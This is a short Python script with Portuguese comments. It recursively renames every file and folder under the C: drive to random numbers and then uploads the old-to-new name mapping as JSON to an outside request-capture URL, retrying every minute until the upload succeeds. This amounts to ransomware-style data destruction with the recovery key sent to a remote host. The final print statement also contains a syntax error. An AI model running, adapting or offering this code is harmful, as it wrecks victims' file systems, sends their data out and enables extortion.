import os
import pathlib
import json
from random import randint
import requests, time

root = "C:/" #Nao rode com esse root

pathDictionary = {}

#for que varre todas as pastas existentes dentro da pasta root
for path, subdirs, files in os.walk(root):

 print("Folder: " + path)
 print("Subfolders: " + str(subdirs))


 #Para cada arquivo no diretorio atual:
 for name in files:

  #try catch caso o nome selecionado seja igual a um nome ja usado
  try:

   #Printa o arquivo atualmente selecionado pelo for
   print("[FILE NAME] File to be renamed: " + name)

   #Salva o nome do arquivo a ser renomeado em filename e printa           
   filename = pathlib.PurePath(path, name)
   print("  file is " + str(pathlib.PurePath(path, name)))

   #Escolhe o novo nome, salva na variavel newname e printa
   newname = str(randint(0,9999999))
   print ("  new name is " + newname)

   #Renomeia o arquivo com nome filename com o nome newname
   os.rename(filename, pathlib.PurePath(path, newname))

   #Atualiza o dicionario com os nomes de arquivos antigos e os novos
   pathDictionary.update({ str(filename) : str(pathlib.PurePath(path, newname))})
   
  except:
   pass

 if len(subdirs) > 0:

  #Para cada subdiretorio     
  for subnum in range(len(subdirs)):

   #Muda a pasta local de trabalho para a pasta onde esta os subdiretorios (serve para os.getcwd() funcionar)
   os.chdir(path)

   #Salva o nome da subdiretorio que sera renomeado em dirname e printa
   dirname = subdirs[subnum]
   print("[DIR NAME]dirname is " + dirname)

   #Escolhe um novo nome, salva na variavel newdirname e printa
   newdirname = str(randint(0,9999999))
   print ("  newdirname is:" + newdirname)

   #Renomeia o subdiretorio e printa. Parametros (path atual, path nova)
   os.rename(os.path.join(os.getcwd(), dirname),    os.path.join(os.path.abspath(os.path.join(os.path.abspath(subdirs[subnum]), os.pardir)) , newdirname))
   print("  old name is " + os.path.join(os.getcwd(), dirname))
   print("  new name is " + os.path.join(os.path.abspath(os.path.join(os.path.abspath(subdirs[subnum]), os.pardir)) , newdirname))

   subdirs[subnum] = newdirname
   

os.chdir(root)

#Transforma o dicionario em JSON e escolhe uma URL pra envia-lo
pathJson = json.dumps(pathDictionary)

#Selecionar a localização que deseja enviar o JSON. http://requestb.in/ foi usado nos testes
url = 'http://requestb.in/1o42dav1'
statusCode = 0

while (statusCode != 200):
    try:
        r = requests.post(url, pathJson)
        statusCode = r.status_code
    except:
        pass
    time.sleep(60) #in seconds
    
print ("JSON enviado com sucesso para " url)

